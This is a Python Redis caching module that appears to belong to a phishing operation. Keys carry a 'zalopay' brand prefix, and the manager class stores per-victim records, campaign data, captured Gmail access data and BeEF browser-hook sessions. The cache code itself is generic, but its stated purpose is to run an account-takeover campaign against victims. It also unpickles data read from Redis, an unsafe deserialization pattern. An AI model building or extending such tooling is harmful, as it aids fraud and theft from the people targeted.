"""
Redis Configuration
Redis cache configuration and connection management
"""

import os
import json
import redis
import pickle
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Union
from redis.exceptions import RedisError, ConnectionError, TimeoutError
import logging
import hashlib
import zlib

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class RedisCache:
    """Redis cache management with compression and serialization"""

    def __init__(self, host: str = None, port: int = None, db: int = None,
                 password: str = None, decode_responses: bool = True,
                 socket_timeout: int = 5, socket_connect_timeout: int = 5,
                 retry_on_timeout: bool = True, max_connections: int = 20):
        """
        Initialize Redis cache connection

        Args:
            host: Redis host (default: localhost)
            port: Redis port (default: 6379)
            db: Redis database number (default: 0)
            password: Redis password
            decode_responses: Whether to decode responses as strings
            socket_timeout: Socket timeout in seconds
            socket_connect_timeout: Socket connection timeout in seconds
            retry_on_timeout: Whether to retry on timeout
            max_connections: Maximum connection pool size
        """
        self.host = host or os.getenv("REDIS_HOST", "localhost")
        self.port = port or int(os.getenv("REDIS_PORT", "6379"))
        self.db = db or int(os.getenv("REDIS_DB", "0"))
        self.password = password or os.getenv("REDIS_PASSWORD")
        self.decode_responses = decode_responses

        # Connection pool configuration
        self.connection_pool = redis.ConnectionPool(
            host=self.host,
            port=self.port,
            db=self.db,
            password=self.password,
            decode_responses=decode_responses,
            socket_timeout=socket_timeout,
            socket_connect_timeout=socket_connect_timeout,
            retry_on_timeout=retry_on_timeout,
            max_connections=max_connections,
            health_check_interval=30
        )

        try:
            self.client = redis.Redis(connection_pool=self.connection_pool)
            self.client.ping()
            logger.info(f"Connected to Redis: {self.host}:{self.port}/{self.db}")
        except (ConnectionError, TimeoutError) as e:
            logger.error(f"Failed to connect to Redis: {e}")
            raise
        except Exception as e:
            logger.error(f"Error initializing Redis: {e}")
            raise

    def _serialize_data(self, data: Any) -> bytes:
        """Serialize data with pickle and compress"""
        try:
            pickled_data = pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL)
            compressed_data = zlib.compress(pickled_data, level=6)
            return compressed_data
        except Exception as e:
            logger.error(f"Error serializing data: {e}")
            raise

    def _deserialize_data(self, data: bytes) -> Any:
        """Decompress and deserialize data"""
        try:
            decompressed_data = zlib.decompress(data)
            return pickle.loads(decompressed_data)
        except Exception as e:
            logger.error(f"Error deserializing data: {e}")
            raise

    def _generate_cache_key(self, key: str, prefix: str = "zalopay") -> str:
        """Generate standardized cache key"""
        # Create hash of key for consistent length
        key_hash = hashlib.md5(key.encode()).hexdigest()[:16]
        return f"{prefix}:{key_hash}:{key}"

    def set(self, key: str, value: Any, expire_seconds: int = None,
            expire_minutes: int = None, expire_hours: int = None,
            expire_days: int = None, prefix: str = "zalopay") -> bool:
        """
        Set cache value with optional expiration

        Args:
            key: Cache key
            value: Value to cache
            expire_seconds: Expiration in seconds
            expire_minutes: Expiration in minutes
            expire_hours: Expiration in hours
            expire_days: Expiration in days
            prefix: Key prefix for namespacing

        Returns:
            bool: True if successful
        """
        try:
            # Calculate total expiration in seconds
            total_seconds = 0
            if expire_seconds:
                total_seconds += expire_seconds
            if expire_minutes:
                total_seconds += expire_minutes * 60
            if expire_hours:
                total_seconds += expire_hours * 3600
            if expire_days:
                total_seconds += expire_days * 86400

            # Default to 1 hour if no expiration specified
            if total_seconds == 0:
                total_seconds = 3600

            # Generate cache key
            cache_key = self._generate_cache_key(key, prefix)

            # Serialize and store
            serialized_value = self._serialize_data(value)

            result = self.client.setex(cache_key, total_seconds, serialized_value)

            if result:
                logger.debug(f"Cache set: {cache_key}")
                return True
            else:
                logger.error(f"Failed to set cache: {cache_key}")
                return False

        except (RedisError, Exception) as e:
            logger.error(f"Error setting cache {key}: {e}")
            return False

    def get(self, key: str, prefix: str = "zalopay") -> Any:
        """
        Get cached value

        Args:
            key: Cache key
            prefix: Key prefix for namespacing

        Returns:
            Cached value or None if not found
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            cached_data = self.client.get(cache_key)

            if cached_data is None:
                logger.debug(f"Cache miss: {cache_key}")
                return None

            # Deserialize data
            deserialized_value = self._deserialize_data(cached_data)
            logger.debug(f"Cache hit: {cache_key}")
            return deserialized_value

        except (RedisError, Exception) as e:
            logger.error(f"Error getting cache {key}: {e}")
            return None

    def delete(self, key: str, prefix: str = "zalopay") -> bool:
        """
        Delete cached value

        Args:
            key: Cache key
            prefix: Key prefix for namespacing

        Returns:
            bool: True if deleted
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            result = self.client.delete(cache_key)

            if result > 0:
                logger.debug(f"Cache deleted: {cache_key}")
                return True
            else:
                logger.debug(f"Cache key not found: {cache_key}")
                return False

        except (RedisError, Exception) as e:
            logger.error(f"Error deleting cache {key}: {e}")
            return False

    def exists(self, key: str, prefix: str = "zalopay") -> bool:
        """
        Check if key exists in cache

        Args:
            key: Cache key
            prefix: Key prefix for namespacing

        Returns:
            bool: True if exists
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            return bool(self.client.exists(cache_key))
        except (RedisError, Exception) as e:
            logger.error(f"Error checking cache existence {key}: {e}")
            return False

    def set_multiple(self, mapping: Dict[str, Any], expire_seconds: int = 3600,
                    prefix: str = "zalopay") -> bool:
        """
        Set multiple cache values

        Args:
            mapping: Dictionary of key-value pairs
            expire_seconds: Expiration in seconds
            prefix: Key prefix for namespacing

        Returns:
            bool: True if all successful
        """
        try:
            pipeline = self.client.pipeline()

            for key, value in mapping.items():
                cache_key = self._generate_cache_key(key, prefix)
                serialized_value = self._serialize_data(value)
                pipeline.setex(cache_key, expire_seconds, serialized_value)

            results = pipeline.execute()

            # Check if all operations succeeded
            success = all(result for result in results)
            logger.debug(f"Batch cache set: {len(mapping)} items")
            return success

        except (RedisError, Exception) as e:
            logger.error(f"Error setting multiple cache items: {e}")
            return False

    def get_multiple(self, keys: List[str], prefix: str = "zalopay") -> Dict[str, Any]:
        """
        Get multiple cached values

        Args:
            keys: List of cache keys
            prefix: Key prefix for namespacing

        Returns:
            Dict of key-value pairs (only existing keys)
        """
        try:
            cache_keys = [self._generate_cache_key(key, prefix) for key in keys]
            cached_data = self.client.mget(cache_keys)

            results = {}
            for i, data in enumerate(cached_data):
                if data is not None:
                    try:
                        deserialized_value = self._deserialize_data(data)
                        results[keys[i]] = deserialized_value
                    except Exception as e:
                        logger.warning(f"Error deserializing cached data for {keys[i]}: {e}")

            return results

        except (RedisError, Exception) as e:
            logger.error(f"Error getting multiple cache items: {e}")
            return {}

    def increment(self, key: str, amount: int = 1, prefix: str = "zalopay") -> int:
        """
        Increment numeric cache value

        Args:
            key: Cache key
            amount: Amount to increment
            prefix: Key prefix for namespacing

        Returns:
            int: New value after increment
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            return self.client.incr(cache_key, amount)
        except (RedisError, Exception) as e:
            logger.error(f"Error incrementing cache {key}: {e}")
            return 0

    def expire(self, key: str, seconds: int, prefix: str = "zalopay") -> bool:
        """
        Set expiration for existing cache key

        Args:
            key: Cache key
            seconds: Expiration in seconds
            prefix: Key prefix for namespacing

        Returns:
            bool: True if successful
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            return bool(self.client.expire(cache_key, seconds))
        except (RedisError, Exception) as e:
            logger.error(f"Error setting expiration for {key}: {e}")
            return False

    def get_ttl(self, key: str, prefix: str = "zalopay") -> int:
        """
        Get time-to-live for cache key

        Args:
            key: Cache key
            prefix: Key prefix for namespacing

        Returns:
            int: TTL in seconds (-1 if no expiration, -2 if key doesn't exist)
        """
        try:
            cache_key = self._generate_cache_key(key, prefix)
            return self.client.ttl(cache_key)
        except (RedisError, Exception) as e:
            logger.error(f"Error getting TTL for {key}: {e}")
            return -2

    def clear_pattern(self, pattern: str, prefix: str = "zalopay") -> int:
        """
        Clear cache keys matching pattern

        Args:
            pattern: Key pattern to match
            prefix: Key prefix for namespacing

        Returns:
            int: Number of keys deleted
        """
        try:
            full_pattern = f"{prefix}:*:{pattern}"
            keys = self.client.keys(full_pattern)

            if keys:
                return self.client.delete(*keys)
            else:
                return 0

        except (RedisError, Exception) as e:
            logger.error(f"Error clearing cache pattern {pattern}: {e}")
            return 0

    def get_stats(self) -> Dict[str, Any]:
        """Get Redis cache statistics"""
        try:
            info = self.client.info()

            # Get memory usage for our keys
            zalopay_keys = self.client.keys("zalopay:*")
            memory_usage = 0

            if zalopay_keys:
                memory_sizes = self.client.memory_usage(*zalopay_keys)
                memory_usage = sum(size for size in memory_sizes if size)

            return {
                "connected_clients": info.get("connected_clients", 0),
                "used_memory_mb": info.get("used_memory_human", "0B"),
                "keyspace_hits": info.get("keyspace_hits", 0),
                "keyspace_misses": info.get("keyspace_misses", 0),
                "hit_rate": self._calculate_hit_rate(info),
                "zalopay_keys_count": len(zalopay_keys),
                "zalopay_memory_usage_bytes": memory_usage,
                "uptime_days": info.get("uptime_in_days", 0)
            }

        except (RedisError, Exception) as e:
            logger.error(f"Error getting cache stats: {e}")
            return {"error": str(e)}

    def _calculate_hit_rate(self, info: Dict[str, Any]) -> float:
        """Calculate cache hit rate"""
        hits = info.get("keyspace_hits", 0)
        misses = info.get("keyspace_misses", 0)
        total = hits + misses

        if total == 0:
            return 0.0

        return (hits / total) * 100

    def flush_all(self) -> bool:
        """
        Flush all cache data (dangerous operation)

        Returns:
            bool: True if successful
        """
        try:
            self.client.flushall()
            logger.warning("All cache data flushed")
            return True
        except (RedisError, Exception) as e:
            logger.error(f"Error flushing cache: {e}")
            return False

    def health_check(self) -> Dict[str, Any]:
        """Perform health check on Redis connection"""
        try:
            start_time = datetime.now(timezone.utc)

            # Test basic operations
            test_key = "health_check_test"
            test_value = {"test": "data", "timestamp": start_time.isoformat()}

            # Set test data
            self.set(test_key, test_value, expire_seconds=10)

            # Get test data
            retrieved_value = self.get(test_key)

            # Clean up
            self.delete(test_key)

            end_time = datetime.now(timezone.utc)
            response_time = (end_time - start_time).total_seconds() * 1000  # milliseconds

            success = retrieved_value == test_value

            return {
                "healthy": success,
                "response_time_ms": response_time,
                "timestamp": end_time.isoformat(),
                "error": None if success else "Health check failed"
            }

        except Exception as e:
            return {
                "healthy": False,
                "response_time_ms": None,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "error": str(e)
            }

class RedisCacheManager:
    """High-level Redis cache manager with predefined cache strategies"""

    def __init__(self, redis_config: Dict[str, Any] = None):
        """
        Initialize cache manager

        Args:
            redis_config: Redis configuration dictionary
        """
        self.redis_config = redis_config or {}
        self.cache = RedisCache(**self.redis_config)

        # Predefined cache durations
        self.cache_durations = {
            "short": 300,        # 5 minutes
            "medium": 1800,      # 30 minutes
            "long": 7200,        # 2 hours
            "extended": 86400,   # 24 hours
            "persistent": 604800 # 7 days
        }

    def cache_victim_data(self, victim_id: str, victim_data: Dict[str, Any]) -> bool:
        """Cache victim data"""
        return self.cache.set(
            f"victim:{victim_id}",
            victim_data,
            expire_seconds=self.cache_durations["medium"]
        )

    def get_cached_victim(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get cached victim data"""
        return self.cache.get(f"victim:{victim_id}")

    def cache_campaign_data(self, campaign_id: str, campaign_data: Dict[str, Any]) -> bool:
        """Cache campaign data"""
        return self.cache.set(
            f"campaign:{campaign_id}",
            campaign_data,
            expire_seconds=self.cache_durations["long"]
        )

    def get_cached_campaign(self, campaign_id: str) -> Optional[Dict[str, Any]]:
        """Get cached campaign data"""
        return self.cache.get(f"campaign:{campaign_id}")

    def cache_admin_session(self, session_id: str, session_data: Dict[str, Any],
                           expire_minutes: int = 60) -> bool:
        """Cache admin session data"""
        return self.cache.set(
            f"admin_session:{session_id}",
            session_data,
            expire_minutes=expire_minutes
        )

    def get_cached_admin_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get cached admin session data"""
        return self.cache.get(f"admin_session:{session_id}")

    def cache_activity_stats(self, stats_key: str, stats_data: Dict[str, Any]) -> bool:
        """Cache activity statistics"""
        return self.cache.set(
            f"activity_stats:{stats_key}",
            stats_data,
            expire_seconds=self.cache_durations["short"]
        )

    def get_cached_activity_stats(self, stats_key: str) -> Optional[Dict[str, Any]]:
        """Get cached activity statistics"""
        return self.cache.get(f"activity_stats:{stats_key}")

    def cache_gmail_access_data(self, access_id: str, access_data: Dict[str, Any]) -> bool:
        """Cache Gmail access data"""
        return self.cache.set(
            f"gmail_access:{access_id}",
            access_data,
            expire_seconds=self.cache_durations["medium"]
        )

    def get_cached_gmail_access(self, access_id: str) -> Optional[Dict[str, Any]]:
        """Get cached Gmail access data"""
        return self.cache.get(f"gmail_access:{access_id}")

    def cache_beef_session_data(self, session_id: str, session_data: Dict[str, Any]) -> bool:
        """Cache BeEF session data"""
        return self.cache.set(
            f"beef_session:{session_id}",
            session_data,
            expire_seconds=self.cache_durations["short"]
        )

    def get_cached_beef_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get cached BeEF session data"""
        return self.cache.get(f"beef_session:{session_id}")

    def cache_api_response(self, endpoint: str, response_data: Any,
                          params: Dict[str, Any] = None) -> bool:
        """Cache API response data"""
        # Create cache key from endpoint and parameters
        params_str = json.dumps(params, sort_keys=True) if params else ""
        cache_key = f"api:{endpoint}:{hashlib.md5(params_str.encode()).hexdigest()}"

        return self.cache.set(
            cache_key,
            response_data,
            expire_seconds=self.cache_durations["short"]
        )

    def get_cached_api_response(self, endpoint: str, params: Dict[str, Any] = None) -> Any:
        """Get cached API response"""
        params_str = json.dumps(params, sort_keys=True) if params else ""
        cache_key = f"api:{endpoint}:{hashlib.md5(params_str.encode()).hexdigest()}"

        return self.cache.get(cache_key)

    def invalidate_victim_cache(self, victim_id: str) -> bool:
        """Invalidate all victim-related cache"""
        return self.cache.clear_pattern(f"victim:{victim_id}*") > 0

    def invalidate_campaign_cache(self, campaign_id: str) -> bool:
        """Invalidate all campaign-related cache"""
        return self.cache.clear_pattern(f"campaign:{campaign_id}*") > 0

    def invalidate_admin_session_cache(self, session_id: str) -> bool:
        """Invalidate admin session cache"""
        return self.cache.delete(f"admin_session:{session_id}")

    def invalidate_all_cache(self) -> bool:
        """Invalidate all application cache"""
        return self.cache.clear_pattern("*") > 0

    def get_cache_info(self) -> Dict[str, Any]:
        """Get comprehensive cache information"""
        try:
            stats = self.cache.get_stats()

            # Get cache counts by type
            all_keys = self.cache.client.keys("zalopay:*")
            type_counts = {}

            for key in all_keys:
                key_str = key.decode() if isinstance(key, bytes) else key
                key_parts = key_str.split(":")
                if len(key_parts) >= 2:
                    cache_type = key_parts[1]  # Second part after zalopay:
                    type_counts[cache_type] = type_counts.get(cache_type, 0) + 1

            return {
                "redis_stats": stats,
                "cache_type_distribution": type_counts,
                "total_zalopay_keys": len(all_keys),
                "health_check": self.cache.health_check()
            }

        except Exception as e:
            logger.error(f"Error getting cache info: {e}")
            return {"error": str(e)}

    def cleanup_expired_cache(self) -> int:
        """Clean up expired cache entries"""
        try:
            # Redis handles TTL automatically, but we can force cleanup
            # by checking for keys that should have expired
            return 0  # Redis handles this automatically

        except Exception as e:
            logger.error(f"Error cleaning up expired cache: {e}")
            return 0

class RedisConfig:
    """Redis configuration management"""

    @staticmethod
    def get_default_config() -> Dict[str, Any]:
        """Get default Redis configuration"""
        return {
            "host": os.getenv("REDIS_HOST", "localhost"),
            "port": int(os.getenv("REDIS_PORT", "6379")),
            "db": int(os.getenv("REDIS_DB", "0")),
            "password": os.getenv("REDIS_PASSWORD"),
            "decode_responses": True,
            "socket_timeout": 5,
            "socket_connect_timeout": 5,
            "retry_on_timeout": True,
            "max_connections": 20
        }

    @staticmethod
    def get_production_config() -> Dict[str, Any]:
        """Get production-ready Redis configuration"""
        return {
            "host": os.getenv("REDIS_HOST", "redis-cluster"),
            "port": int(os.getenv("REDIS_PORT", "6379")),
            "db": int(os.getenv("REDIS_DB", "0")),
            "password": os.getenv("REDIS_PASSWORD"),
            "decode_responses": True,
            "socket_timeout": 10,
            "socket_connect_timeout": 10,
            "retry_on_timeout": True,
            "max_connections": 50,
            "connection_pool_kwargs": {
                "retry_on_timeout": True,
                "socket_keepalive": True,
                "socket_keepalive_options": {}
            }
        }

    @staticmethod
    def validate_config(config: Dict[str, Any]) -> List[str]:
        """Validate Redis configuration"""
        errors = []

        if not config.get("host"):
            errors.append("Redis host is required")

        if not isinstance(config.get("port"), int) or config.get("port") <= 0:
            errors.append("Redis port must be a positive integer")

        if not isinstance(config.get("db"), int) or config.get("db") < 0:
            errors.append("Redis database must be a non-negative integer")

        if config.get("max_connections", 0) < 1:
            errors.append("Max connections must be at least 1")

        return errors